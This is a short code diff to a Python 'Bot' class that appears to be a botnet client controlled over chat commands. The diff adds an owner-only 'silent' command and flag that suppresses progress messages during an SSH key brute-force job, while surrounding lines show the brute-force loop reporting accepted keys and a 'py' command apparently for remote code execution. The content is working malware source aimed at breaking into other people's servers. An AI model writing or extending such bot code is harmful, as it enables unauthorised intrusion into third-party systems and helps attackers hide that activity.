@@ -25,6 +25,7 @@ class Bot:
 		self.__vnc = {}
 		self.__key = 0
 		self.__nick = nick
+		self.__silent = True
 		self.__lol = LOLClean('1201f800-aced-4abb-9083-714dcf58a36e')
 
 	def add_connection(self, sv, port):
@@ -167,6 +168,17 @@ class Bot:
 			if args[0] in self.__threads:
 				self.__threads.pop(args[0], None)
 
+		if (cmd == 'silent'):
+			if not self.check_owner(source, place):
+				return
+			if not self.check_args(args, 1, place):
+				return
+			if args[0] == '1':
+				self.__silent = True
+			elif args[0] == '0':
+				self.__silent = False
+			self.printayne('silent mode => {0}'.format(self.__silent), [place])
+
 		if (cmd == 'py'):
 			if not self.check_owner(source, place):
 				return
@@ -305,6 +317,8 @@ class Bot:
 		for k in keys:
 			if not self.job_running('bssh'):
 				return
+			if not self.__silent:
+				self.printayne('brute forcing {0} with key {1}'.format(target, k), [place])
 			if self.bssh_u(ssh, target, k.strip('\r\n')):
 				self.printayne('ssh {0} KEY {1} ACCEPTED'.format(target, k), [place])
 		self.pop_job('bssh')
